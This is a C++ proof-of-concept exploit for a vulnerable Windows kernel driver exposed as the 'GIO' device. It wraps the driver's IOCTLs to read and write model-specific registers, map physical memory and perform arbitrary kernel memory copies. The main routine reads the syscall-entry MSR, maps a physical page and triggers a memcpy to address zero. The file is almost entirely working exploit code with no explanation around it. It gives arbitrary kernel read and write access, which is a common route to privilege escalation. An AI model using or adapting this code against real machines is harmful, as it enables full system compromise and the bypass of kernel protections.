#include <Windows.h>
#include <iostream>
#include <assert.h>
#include <Psapi.h>
using namespace std;

#define IOCTL_GIO_MSRACCESS 0x0C3502580
#define IOCTL_GIO_MAPPHYSICAL 0xC3502004
#define IOCTL_GIO_UNMAPPHYSICAL 0xC3502008
#define IOCTL_GIO_MEMCPY 0xC3502808

class POC {
private:
	HANDLE ghDriver = INVALID_HANDLE_VALUE;
#pragma pack(push, 1)
	typedef struct _MSR_STRUCT {
		DWORD rw;
		DWORD reg;
		ULONG64 value;
	}MSR_STRUCT, *PMSR_STRUCT;

	typedef struct _GIO_PHMAP {
		DWORD InterfaceType;
		DWORD Bus;
		ULONG64 PhysicalAddress;
		DWORD IOSpace;
		DWORD size;
	}GIO_PHMAP;

	typedef struct _GIO_MemCpyStruct {
		uint64_t dest;
		uint64_t src;
		DWORD size;
	}GIO_MemCpyStruct;
#pragma pack(pop)

public:
	BOOL GetHandle() {
		ghDriver = CreateFile("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
		if (ghDriver == INVALID_HANDLE_VALUE) {
			cout << "[-] CreateFileA Failed.\n";
			return false;
		}
		cout << "[+] Opened handle to device with value 0x" << hex << ghDriver << endl;
		return true;
	}

	BOOL WriteMsr(DWORD reg, ULONG64 value) {
		MSR_STRUCT inBuffer = { 0 };
		inBuffer.reg = reg;
		inBuffer.value = value;
		inBuffer.rw = 0x0;

		DWORD returned = 0x0;
		assert(ghDriver != INVALID_HANDLE_VALUE, "[-] Invalid Handle Value");
		auto Ok = DeviceIoControl(ghDriver, IOCTL_GIO_MSRACCESS, &inBuffer, sizeof(MSR_STRUCT),
			nullptr, 0, &returned, nullptr);
		if (!Ok) {
			cout << "[-] DeviceIoControl Failed with error 0x" << hex << GetLastError() << endl;
			return false;
		}
		return true;
	}

	uint64_t ReadMsr(DWORD reg) {
		MSR_STRUCT inBuffer = { 0 };
		inBuffer.reg = reg;
		inBuffer.rw = 0x1;
		MSR_STRUCT outBuffer = { 0 };
		uint64_t returnedValue = 0x0;

		DWORD returned = 0x0;
		assert(ghDriver != INVALID_HANDLE_VALUE, "[-] Invalid Handle Value");
		auto Ok = DeviceIoControl(ghDriver, IOCTL_GIO_MSRACCESS, &inBuffer, sizeof(MSR_STRUCT),
			&outBuffer, sizeof(MSR_STRUCT), &returned, nullptr);
		if (!Ok) {
			cout << "[-] DeviceIoControl Failed with error 0x" << hex << GetLastError() << endl;
			return NULL;
		}

		return outBuffer.value;
	}

	uint64_t MapPhysicalMemory(ULONG64 physical_address, DWORD size) {
		GIO_PHMAP inBuffer = { 0 };
		inBuffer.PhysicalAddress = physical_address;
		inBuffer.size = size;

		GIO_PHMAP outBuffer = { 0 };
		assert(ghDriver != INVALID_HANDLE_VALUE, "[-] Invalid Handle Value");
		DWORD returnedBytes = 0x0;
		auto Ok = DeviceIoControl(ghDriver, IOCTL_GIO_MAPPHYSICAL, &inBuffer, sizeof(GIO_PHMAP),
			&outBuffer, sizeof(GIO_PHMAP), &returnedBytes, nullptr);
		if (!Ok) {
			cout << "[-] " << __FUNCTION__ << " DeviceIoControl Failed with error code 0x" << hex << GetLastError() << endl;
			return NULL;
		}

		return outBuffer.PhysicalAddress;
	}

	BOOL UnMapPhysicalMemory(ULONG64 physical_address) {
		GIO_PHMAP inBuffer = { 0 };
		inBuffer.PhysicalAddress = physical_address;

		DWORD returnedBytes = 0x0;
		auto Ok = DeviceIoControl(ghDriver, IOCTL_GIO_UNMAPPHYSICAL, &inBuffer, sizeof(GIO_PHMAP),
			nullptr, 0, &returnedBytes, nullptr);
		if (!Ok) {
			cout << "[-] " << __FUNCTION__ << " DeviceIoControl Failed with error code 0x" << hex << GetLastError() << endl;
			return false;
		}

		return true;
	}

	BOOL GIO_memcpy(uint64_t dest, uint64_t src, DWORD size) {
		GIO_MemCpyStruct mystructIn = { dest,src, size };
		BYTE outbuffer[0x30] = { 0 };
		DWORD returned = 0;

		DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, (LPVOID)& mystructIn, sizeof(mystructIn),
			(LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
		if (returned)
			return true;
		return false;
	}
};

int main(int argc, char* argv[]) {
	POC poc{};

	if (!poc.GetHandle()) {
		cout << "[-] Failed to Gethandle to Device\n";
		return 1;
	}

	DWORD reg = 0xc0000082;
	uint64_t value = poc.ReadMsr(reg);
	cout << "[+] ReadMsr Value : 0x" << hex << value << endl;

	uint64_t physmem = poc.MapPhysicalMemory(0xdf00, 0x1000);
	cout << "[+] Physical Memory : 0x" << hex << physmem << endl;

	poc.GIO_memcpy(0x0000000000000000, 0x41414141, 0x8);

	return 0;
}